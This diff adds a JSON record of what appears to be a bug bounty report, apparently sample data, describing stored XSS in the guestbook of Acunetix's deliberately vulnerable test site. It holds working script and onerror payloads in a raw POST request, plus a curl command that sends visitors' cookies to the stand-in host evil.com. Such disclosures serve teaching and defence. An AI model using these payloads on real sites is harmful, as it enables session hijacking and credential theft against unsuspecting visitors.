@@ -1,0 +1,14 @@
+{
+  "id": 800003,
+  "title": "Stored XSS via Guestbook Form on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 61, "name": "Cross-site Scripting (XSS) - Stored"},
+  "vulnerability_information": "## Summary\nThe guestbook feature at `http://testphp.vulnweb.com/guestbook.php` is vulnerable to Stored Cross-Site Scripting. The application accepts user input via a POST request with `name` and `text` parameters and renders the submitted content directly into the page without sanitization or encoding. Any visitor to the guestbook page will execute the attacker's JavaScript.\n\n## Steps to Reproduce\n1. Navigate to `http://testphp.vulnweb.com/guestbook.php`\n2. The form has a hidden field `name` set to \"anonymous user\" and a `text` textarea.\n3. Submit the following POST request:\n```http\nPOST /guestbook.php HTTP/1.1\nHost: testphp.vulnweb.com\nContent-Type: application/x-www-form-urlencoded\n\nname=attacker<script>alert(document.cookie)</script>&text=Normal+looking+message<img+src=x+onerror=alert('XSS')>&submit=add+message\n```\n4. Navigate back to `http://testphp.vulnweb.com/guestbook.php`\n5. Observe that the injected JavaScript executes automatically for any visitor — the `<script>` tag in the name field and `<img onerror>` in the text field both fire.\n\n## Proof of Concept\nThe guestbook form at `/guestbook.php` uses this HTML:\n```html\n<form action=\"\" method=\"post\" name=\"faddentry\">\n  <input type=\"hidden\" name=\"name\" value=\"anonymous user\">\n  <textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>\n  <br>\n  <input type=\"submit\" name=\"submit\" value=\"add message\">\n</form>\n```\n\nUsing curl:\n```bash\ncurl -X POST 'http://testphp.vulnweb.com/guestbook.php' \\\n  -d 'name=<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>&text=Hello&submit=add+message'\n```\n\nThe stored payload appears in the guestbook table and executes for every subsequent visitor.\n\n## Impact\nThis is a **Stored XSS** vulnerability, which is more severe than reflected XSS because:\n- The payload persists and affects all users who visit the guestbook\n- An attacker can steal session cookies, perform actions as any logged-in user\n- Can be used for phishing by injecting fake login forms\n- Enables keylogging and credential harvesting for any visitor\n- No user interaction beyond visiting the page is required",
+  "disclosed_at": "2025-07-01T09:00:00.000Z",
+  "bounty_amount": "1500.0"
+}
